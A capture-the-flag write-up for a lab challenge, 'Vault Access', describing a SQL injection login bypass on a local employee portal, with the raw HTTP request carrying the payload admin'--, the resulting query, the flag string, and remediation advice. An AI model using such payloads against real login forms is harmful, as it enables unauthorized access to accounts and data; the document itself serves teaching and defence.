# Writeup- Vault Access

---

## Challenge Name / Title

**Vault Access**

---

## Vulnerability Identified

**SQL Injection - Authentication Bypass**

The Employee Portal login form at `/employee-portal` was found to be vulnerable to SQL Injection. When a single quote `'` was submitted in the username field, the application returned a raw database error message:

```
DB Error: unrecognized token: "'"
```

This revealed that user input was being directly embedded into a SQL query without any sanitization or parameterization, allowing an attacker to manipulate the query logic and bypass authentication entirely.

---

## Exploitation Steps / Description

**Step 1:** Navigate to the Employee Portal login page:
```
http://localhost:3000/employee-portal
```

**Step 2:** Open Burp Suite → Repeater and send the following request:

```http
POST /employee-portal HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

username=admin'--&password=x
```

**Step 3:** The injected payload `admin'--` causes the backend SQL query to become:

```sql
SELECT * FROM employees WHERE username='admin'--' AND password='x'
```

The `--` is a SQL comment — everything after it is ignored, so the password check is never evaluated.

**Step 4:** The server returns `200 OK` and loads the Employee Dashboard with the flag visible in the HTML response body.

---


## Flag Obtained

```
FLAG{vault_2c59ca37}
```

---

## Impact

In a real banking application, this vulnerability would allow any unauthenticated attacker on the internet to:
- Bypass employee login completely without knowing any valid credentials
- Gain access to internal employee dashboards and administrative functions
- View, modify, or delete sensitive customer financial data
- Potentially escalate to full database compromise

This represents a **Critical** severity finding that could result in regulatory action under PCI-DSS and GDPR, financial loss, and severe reputational damage.

---

## Mitigation / Remediation

1. **Use Parameterized Queries:** Replace all raw SQL string concatenation with prepared statements. Pass user input as bound parameters, never embed it directly in the query string.
2. **Suppress Database Errors:** Never expose raw database error messages to end users. Log errors server-side and return a generic message to the client.
3. **Input Validation:** Validate that the username only contains expected characters before processing.
4. **Least Privilege:** Ensure the database account used by the application has only the minimum permissions required.
